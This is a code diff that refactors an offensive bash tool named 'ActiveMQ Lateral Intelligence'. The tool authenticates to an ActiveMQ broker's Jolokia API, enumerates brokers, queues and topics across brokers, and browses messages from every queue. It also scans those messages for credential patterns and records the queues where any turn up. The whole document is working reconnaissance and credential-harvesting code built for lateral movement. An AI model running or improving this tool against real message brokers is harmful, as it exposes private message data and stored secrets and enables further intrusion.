@@ -39,49 +39,43 @@ mkdir -p "$OUT"
 if ! jolokia_auth_works; then err "Jolokia auth failed for $USER:$PASS"; exit 2; fi
 hit "Authed to $HOST:$PORT as $USER"
 
-# 1. Broker info
-log "Pulling broker info"
-curl -sk -m 5 -u "$USER:$PASS" "$(jolokia_url)/read/org.apache.activemq:type=Broker,brokerName=localhost" \
-    > "$OUT/broker.json"
+PARSER="$SCRIPT_DIR/jolokia_inventory.py"
+log "Discovering broker object names"
+curl -sk -m 8 -u "$USER:$PASS" "$(jolokia_url)/search/org.apache.activemq:type=Broker,brokerName=*" > "$OUT/brokers.json"
+mapfile -t BROKERS < <(python3 "$PARSER" Broker "$OUT/brokers.json")
+[ "${#BROKERS[@]}" -gt 0 ] || { err "no broker objects discovered"; exit 3; }
 
-BROKER_VERSION=$(grep -oE '"BrokerVersion":"[^"]+"' "$OUT/broker.json" | head -1 | sed 's/.*:"//; s/"$//')
-BROKER_NAME=$(grep -oE '"BrokerName":"[^"]+"' "$OUT/broker.json" | head -1 | sed 's/.*:"//; s/"$//')
-[ -z "$BROKER_NAME" ] && BROKER_NAME="localhost"
-log "Broker: $BROKER_NAME  version: $BROKER_VERSION"
-
-# 2. List all queues
-log "Enumerating queues"
-curl -sk -m 8 -u "$USER:$PASS" "$(jolokia_url)/search/org.apache.activemq:type=Broker,brokerName=$BROKER_NAME,destinationType=Queue,destinationName=*" \
+curl -sk -m 8 -u "$USER:$PASS" \
+    "$(jolokia_url)/search/org.apache.activemq:type=Broker,brokerName=*,destinationType=Queue,destinationName=*" \
     > "$OUT/queues.json"
-QUEUES=$(grep -oE 'destinationName=[^,"]+' "$OUT/queues.json" | sed 's/destinationName=//' | grep -v '^\*$' | sort -u)
-QCOUNT=$(echo "$QUEUES" | wc -l)
-hit "$QCOUNT queues found"
-
-# 3. List topics
-log "Enumerating topics"
-curl -sk -m 8 -u "$USER:$PASS" "$(jolokia_url)/search/org.apache.activemq:type=Broker,brokerName=$BROKER_NAME,destinationType=Topic,destinationName=*" \
+python3 "$PARSER" Queue "$OUT/queues.json" > "$OUT/queue-records.tsv"
+curl -sk -m 8 -u "$USER:$PASS" \
+    "$(jolokia_url)/search/org.apache.activemq:type=Broker,brokerName=*,destinationType=Topic,destinationName=*" \
     > "$OUT/topics.json"
-TOPICS=$(grep -oE '"destinationName=[^"]+"' "$OUT/topics.json" | sed 's/"destinationName=//; s/"$//' | sort -u)
-TCOUNT=$(echo "$TOPICS" | wc -l)
-hit "$TCOUNT topics found"
+python3 "$PARSER" Topic "$OUT/topics.json" > "$OUT/topic-records.tsv"
+sort -u -o "$OUT/queue-records.tsv" "$OUT/queue-records.tsv"
+sort -u -o "$OUT/topic-records.tsv" "$OUT/topic-records.tsv"
+QCOUNT=$(awk 'NF{n++} END{print n+0}' "$OUT/queue-records.tsv")
+TCOUNT=$(awk 'NF{n++} END{print n+0}' "$OUT/topic-records.tsv")
+hit "$QCOUNT queues found across ${#BROKERS[@]} broker(s)"
+hit "$TCOUNT topics found across ${#BROKERS[@]} broker(s)"
 
 # 4. For each queue: stats + browse messages
 mkdir -p "$OUT/queues"
-for q in $QUEUES; do
+while IFS=$'\t' read -r _broker_name safe q object_path; do
     [ -z "$q" ] && continue
-    safe=$(echo "$q" | tr '/:.' '___')
     qdir="$OUT/queues/$safe"
     mkdir -p "$qdir"
 
     # Stats
     curl -sk -m 5 -u "$USER:$PASS" \
-        "$(jolokia_url)/read/org.apache.activemq:type=Broker,brokerName=$BROKER_NAME,destinationType=Queue,destinationName=$q" \
+        "$(jolokia_url)/read/$object_path" \
         > "$qdir/stats.json"
 
     # Browse up to MAX_MSGS messages. Jolokia's maxCollectionSize processing
     # option caps the returned message array server-side.
     curl -sk -m 15 -u "$USER:$PASS" \
-        "$(jolokia_url)/exec/org.apache.activemq:type=Broker,brokerName=$BROKER_NAME,destinationType=Queue,destinationName=$q/browseMessages()?maxCollectionSize=$MAX_MSGS" \
+        "$(jolokia_url)/exec/$object_path/browseMessages()?maxCollectionSize=$MAX_MSGS" \
         > "$qdir/messages.json"
 
     # Quick credential pattern search on the raw response
@@ -91,14 +85,14 @@ for q in $QUEUES; do
         hit "  $q  credential pattern found — see $qdir/_cred_matches.txt"
         echo "$q" >> "$OUT/_queues_with_creds.txt"
     fi
-done
+done < "$OUT/queue-records.tsv"
 
 # 5. Summary
 log "Writing summary"
 {
     echo "============================================================"
     echo "  ActiveMQ Lateral Intelligence"
-    echo "  Broker:   $BROKER_NAME / version $BROKER_VERSION"
+    echo "  Brokers:  ${#BROKERS[@]} discovered structurally"
     echo "  Target:   $HOST:$PORT"
     echo "  Time:     $(date -Is)"
     echo "============================================================"
